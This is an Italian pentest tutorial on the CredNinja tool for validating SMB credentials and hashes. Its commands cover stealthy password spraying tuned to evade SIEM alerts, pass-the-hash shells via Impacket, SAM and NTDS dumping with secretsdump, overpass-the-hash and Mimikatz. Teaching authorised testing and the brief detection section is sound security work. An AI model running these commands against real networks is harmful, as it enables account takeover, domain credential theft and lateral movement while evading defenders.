---
title: 'CredNinja: validare credenziali SMB con password e hash NTLM'
slug: credninja
description: 'Usa CredNinja per validare password e hash NTLM via SMB, trovare local admin, eseguire Pass-the-Hash e user hunting, riducendo i lockout con stripe e delay.'
image: /credninja-smb-credential-validation-pth.webp
draft: true
date: 2026-08-21T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - CredNinja
  - smb
  - ntlm
  - Credential Validation
  - Pass-the-Hash
  - Password Spraying
  - Lateral Movement
---

# CredNinja: Pentest e Validazione Credenziali su Rete SMB

CredNinja è un tool Python multithread che verifica in blocco quali credenziali (password o hash NTLM) sono valide su una lista di host Windows, testando l'autenticazione via [SMB](https://hackita.it/articoli/smb/) e segnalando dove ottieni admin locale. Nato come evoluzione di CredSwissArmy, opera di Chris King (@raikiasec).

Per il confronto con lo strumento oggi più usato per lo stesso scopo: [NetExec su HackIta](https://hackita.it/articoli/netexec/)

***

## Come funziona internamente

Tre passaggi, in ordine:

1. **SMB session setup + autenticazione NTLM** — CredNinja apre una sessione SMB verso l'host e prova ad autenticarsi con la credenziale (password o hash).
2. **Esito autenticazione** — se il server rifiuta, la credenziale è invalida su quell'host. Se accetta, sei dentro con un token valido.
3. **Mount di `C$`** — a questo punto prova a montare la share amministrativa. Riuscire ad autenticarsi e riuscire a montare `C$` sono due cose diverse: puoi essere un utente di dominio valido senza essere admin locale. Solo il mount riuscito conferma i privilegi elevati.

Questa distinzione — autenticazione riuscita ≠ privilegi amministrativi — è il concetto chiave da capire prima di usare qualsiasi tool di validazione massiva, non solo CredNinja.

***

## Installazione

```bash
git clone https://github.com/Raikia/CredNinja.git
cd CredNinja
python3 CredNinja.py -h
```

Gira nativo su Kali, richiede `pth-smbclient` per il pass-the-hash — già incluso nei repository Kali.

***

## Tabella completa delle opzioni

| Flag             | Descrizione                                               |
| ---------------- | --------------------------------------------------------- |
| `-a`             | file o valore singolo di credenziali da testare           |
| `-s`             | file o valore singolo di host target                      |
| `-t`             | numero di thread paralleli (default 10)                   |
| `--ntlm`         | tratta la password come hash NTLM → pass-the-hash         |
| `--valid`        | mostra solo i risultati validi                            |
| `--invalid`      | mostra solo i risultati non validi                        |
| `-o`             | scrive i risultati su file                                |
| `-p`             | delimitatore custom tra utente e password (default `:`)   |
| `--scan`         | verifica prima che la 445 sia aperta                      |
| `--scan-timeout` | timeout del controllo 445 (default 2s)                    |
| `--stripe`       | ogni credenziale testata su un solo host a caso           |
| `--delay`        | ritardo casuale tra i tentativi (secondi + jitter)        |
| `--timeout`      | timeout di attesa risposta (default 15s)                  |
| `--os`           | recupera l'OS del target senza richieste extra            |
| `--domain`       | recupera il dominio primario del target                   |
| `--users`        | modalità user hunter — trova dove sono loggati gli utenti |
| `--users-time`   | filtra utenti loggati negli ultimi N giorni (default 100) |
| `--no-color`     | disattiva l'output colorato                               |

***

## Sintassi base

```bash
python3 CredNinja.py -a accounts_to_test.txt -s systems_to_test.txt
```

Formato file account, una riga per credenziale:

```
CONTOSO\jrossi:Password123!
CONTOSO\amariani:Estate2024!
```

Formato file host — IP, hostname, CIDR o direttamente output di un `nmap -oG`:

```bash
nmap -p445 --open -oG smb_hosts.gnmap 10.10.10.0/24
python3 CredNinja.py -a accounts.txt -s smb_hosts.gnmap
```

***

## Fase 0 — Verifica host prima dello scan

`--scan` controlla la 445 prima di mettere l'host in coda — evita di sprecare thread su macchine spente o filtrate.

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt --scan
python3 CredNinja.py -a accounts.txt -s hosts.txt --scan --scan-timeout 3
```

***

## Fase 1 — Validazione credenziali

Output chiave da leggere:

* credenziale rifiutata → invalida
* credenziale accettata, mount C$ fallito → valida, utente senza privilegi
* credenziale accettata, mount C$ riuscito → **local admin**

### Con password in chiaro

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt
```

### Pass-the-Hash

L'hash LM `aad3b435b51404eeaad3b435b51404ee` è sempre uguale su sistemi moderni, quello dopo i `:` è l'NTLM — quello che conta. Approfondimento completo: [Pass-the-Hash su HackIta](https://hackita.it/articoli/pass-the-hash/)

```bash
python3 CredNinja.py -a hashes.txt -s hosts.txt --ntlm
```

File hash nello stesso formato del file password:

```
CONTOSO\svc_backup:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

### Filtrare solo risultati utili

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt --valid
python3 CredNinja.py -a accounts.txt -s hosts.txt --invalid
```

### Salvare l'output

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt -o risultati.txt
```

### Cambiare il delimitatore utente:password

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt -p ";"
```

### Thread e timeout

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt -t 30
python3 CredNinja.py -a accounts.txt -s hosts.txt --timeout 10
```

***

## Fase 2 — Stealth: --stripe e --delay

Testare 50 credenziali contro 200 host senza filtri genera decine di migliaia di eventi di autenticazione in pochi minuti — pattern di password spraying riconoscibile da qualsiasi SIEM configurato con soglie decenti (Event ID 4625 a raffica sullo stesso set di account).

### Stripe — una credenziale, un host a caso

`--stripe` testa ogni credenziale su un solo host scelto casualmente, invece che su tutti. Nessun sistema riceve tentativi ripetuti dallo stesso account.

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt --stripe
```

### Delay — rompere il pattern temporale

`--delay SECONDS %JITTER` inserisce un ritardo tra un tentativo e l'altro, di durata pari a SECONDS con una variazione casuale pari a %JITTER.

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt --stripe --delay 10 20
```

10 secondi di base ± 20% di jitter (8-12 secondi) tra un tentativo e il successivo.

### Combinazione stealth completa

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt --scan --stripe --delay 15 25 -t 5 -o risultati.txt
```

Meno thread, stripe attivo, delay con jitter, output salvato per revisione offline — profilo basso per engagement dove la detection del blue team è parte del test.

***

## Fase 3 — Informazioni aggiuntive senza richieste extra

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt --os
python3 CredNinja.py -a accounts.txt -s hosts.txt --domain
python3 CredNinja.py -a accounts.txt -s hosts.txt --os --domain
```

***

## Fase 4 — User Hunter

`--users` cerca dove sono loggati gli utenti sulla rete — utile per individuare dove un Domain Admin ha una sessione attiva prima di puntare lì un dump LSASS.

```bash
python3 CredNinja.py -a accounts.txt -s hosts.txt --users
python3 CredNinja.py -a accounts.txt -s hosts.txt --users --users-time 30
```

`--users-time 30` filtra solo utenti loggati negli ultimi 30 giorni (default 100).

***

## Limitazioni e prerequisiti

Cose che possono bloccarti prima ancora di iniziare:

* **SMB Signing obbligatorio** sul target → l'autenticazione può comunque riuscire, ma alcune operazioni successive (relay) diventano impossibili
* **Account Lockout Policy** → senza `--stripe`/`--delay` rischi di bloccare account reali su scala
* **LAPS** → password admin locale unica per host, un hash valido su una macchina non vale sulle altre
* **Protected Users / Credential Guard** → impedisce cache NTLM in memoria, riduce la superficie per pass-the-hash
* **NTLM disabilitato** (solo Kerberos) → `--ntlm` non funziona, serve overpass-the-hash (vedi Fase 5)
* **Windows Firewall** con blocco 445 in entrata → CredNinja non vede nemmeno la porta, `--scan` lo segnala subito

### NTSTATUS più comuni durante la validazione

Riferimento ufficiale completo: [Microsoft NTSTATUS values](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55)

| Codice                          | Significato                                                                      |
| ------------------------------- | -------------------------------------------------------------------------------- |
| `STATUS_LOGON_FAILURE`          | credenziale errata                                                               |
| `STATUS_ACCOUNT_LOCKED_OUT`     | account bloccato per troppi tentativi                                            |
| `STATUS_ACCESS_DENIED`          | autenticato ma senza permessi sulla risorsa richiesta                            |
| `STATUS_ACCOUNT_DISABLED`       | account esistente ma disattivato                                                 |
| `STATUS_PASSWORD_EXPIRED`       | password valida ma scaduta, va cambiata                                          |
| `STATUS_LOGON_TYPE_NOT_GRANTED` | utente non autorizzato per quel tipo di logon (es. network logon negato via GPO) |

***

## LOLBins prima di CredNinja

Prima di installare un tool esterno, verifica cosa hai già nativamente:

```powershell
# Windows nativo — test di una singola credenziale su una share
net use \\10.10.10.10\C$ /user:CONTOSO\jrossi Password123!
```

```powershell
# PowerShell — loop di validazione su più host senza binari esterni
$hosts = Get-Content hosts.txt
foreach ($h in $hosts) {
    $cred = New-Object System.Management.Automation.PSCredential("CONTOSO\jrossi", (ConvertTo-SecureString "Password123!" -AsPlainText -Force))
    if (Test-Path "\\$h\C$" -Credential $cred) { Write-Output "$h -> valido" }
}
```

Utile quando l'ambiente ha AppLocker o blocca binari non firmati. CredNinja entra in gioco quando la scala (centinaia di host) rende questi loop troppo lenti da gestire a mano.

***

## CredNinja vs NetExec

CredNinja è fermo dal 2018 (ultima build v2.3, gennaio 2018), funziona solo su SMB. Oggi lo standard per lo stesso task è NetExec, attivamente mantenuto e multi-protocollo (SMB, LDAP, WinRM, RDP, MSSQL).

Comando NetExec equivalente:

```bash
netexec smb hosts.txt -u accounts.txt -p passwords.txt --continue-on-success
```

Vale comunque la pena conoscere CredNinja: codice sorgente semplice da leggere, ottimo per capire *come* funziona la validazione via SMB prima di affidarsi a tool più complessi. Guida completa: [NetExec su HackIta](https://hackita.it/articoli/netexec/)

***

## Fase 5 — Sfruttare la credenziale trovata

CredNinja ti dice *dove* hai admin locale. Da lì la fase offensiva vera parte con [Impacket](https://hackita.it/articoli/impacket/).

### Shell interattiva (crea un servizio, più rumoroso ma full-access)

```bash
psexec.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CONTOSO/svc_backup@10.10.10.50
```

### Shell semi-interattiva via WMI (più stealth, nessun servizio creato su disco)

```bash
wmiexec.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CONTOSO/svc_backup@10.10.10.50
```

### Shell via servizio remoto senza binario su disco

```bash
smbexec.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CONTOSO/svc_backup@10.10.10.50
```

### Dump di SAM/LSA sull'host appena confermato admin

```bash
secretsdump.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CONTOSO/svc_backup@10.10.10.50
```

Se l'host confermato è il DC, stesso comando ma con `-just-dc` per il dump completo di NTDS:

```bash
secretsdump.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CONTOSO/svc_backup@10.10.10.10 -just-dc
```

### Overpass-the-hash — dall'NT hash a un TGT Kerberos

Utile quando NTLM è limitato o loggato più aggressivamente di [Kerberos](https://hackita.it/articoli/kerberos/):

```bash
getTGT.py -dc-ip 10.10.10.10 CONTOSO/svc_backup -hashes :5f4dcc3b5aa765d61d8327deb882cf99
export KRB5CCNAME=svc_backup.ccache
wmiexec.py -k -no-pass CONTOSO/svc_backup@dc01.contoso.local
```

### Pass-the-hash da Windows con Mimikatz (se operi da un host Windows compromesso)

Approfondimento completo: [Mimikatz su HackIta](https://hackita.it/articoli/mimikatz/)

```
sekurlsa::pth /user:svc_backup /domain:contoso.local /ntlm:5f4dcc3b5aa765d61d8327deb882cf99
```

Apre un nuovo processo con il token della credenziale passata — usalo per lanciare `psexec.exe` o `net use` da lì.

***

## Detection rapida (Event ID da controllare se difendi)

```
4625  -> logon falliti, stesso account su più host in poco tempo
4624 tipo 3 -> network logon verso C$ da una sorgente su molti target
4740  -> lockout multipli ravvicinati
```

Contromisura pratica: LAPS per rendere inutile il riuso di hash admin locale tra host.

***

## Workflow operativo

```
Nmap (scoperta 445)
      ↓
CredNinja (validazione credenziali)
      ↓
Host validi
      ↓
Admin locali confermati
      ↓
wmiexec.py / psexec.py
      ↓
secretsdump.py
      ↓
Pass-the-Hash / Overpass-the-Hash
      ↓
Lateral Movement
```

***

## MITRE ATT\&CK

Matrice completa: [MITRE ATT\&CK Enterprise](https://attack.mitre.org/matrices/enterprise/)

| Tattica           | Tecnica                              |
| ----------------- | ------------------------------------ |
| Credential Access | T1110.003 — Password Spraying        |
| Credential Access | T1550.002 — Pass the Hash            |
| Discovery         | T1135 — Network Share Discovery      |
| Lateral Movement  | T1021.002 — SMB/Windows Admin Shares |
| Defense Evasion   | T1078 — Valid Accounts               |

***

## Checklist operativa

```
[ ] Scan preliminare 445 — --scan
[ ] Verifica password policy del dominio prima di validare su larga scala
[ ] Validazione credenziali — con o senza --ntlm
[ ] Se serve stealth → --stripe + --delay
[ ] Filtra risultati utili — --valid
[ ] Estrai OS/dominio extra — --os --domain
[ ] User hunter su host con sessioni admin — --users
[ ] Salva output per revisione — -o
[ ] Su ogni host confermato admin -> wmiexec.py / secretsdump.py
[ ] Se target è DC -> secretsdump.py -just-dc
[ ] Valuta NetExec se serve più di SMB
```

***

## FAQ

**CredNinja funziona con hash NTLM?**
Sì, con `--ntlm` tratta la stringa fornita come hash e fa pass-the-hash automaticamente, senza bisogno della password in chiaro.

**È ancora un tool valido nel 2026?**
Per capire i concetti sì, per uso operativo reale è preferibile NetExec, attivamente mantenuto e con supporto multi-protocollo.

**Serve installare dipendenze particolari?**
Su Kali Linux gira out-of-the-box. Per pass-the-hash serve `pth-smbclient`, incluso di default nei repository Kali.

**CredNinja può bloccare account per troppi tentativi falliti?**
Sì, come qualunque tool di validazione massiva. Senza `--stripe` o delay, un dominio con policy di lockout aggressiva può bloccare gli account testati.

***

*Guida a CredNinja — repository originale: [github.com/Raikia/CredNinja](https://github.com/Raikia/CredNinja). Per approfondire Active Directory: [Guida AD su HackIta](https://hackita.it/articoli/active-directory/)*

\#credninja #smb #pth
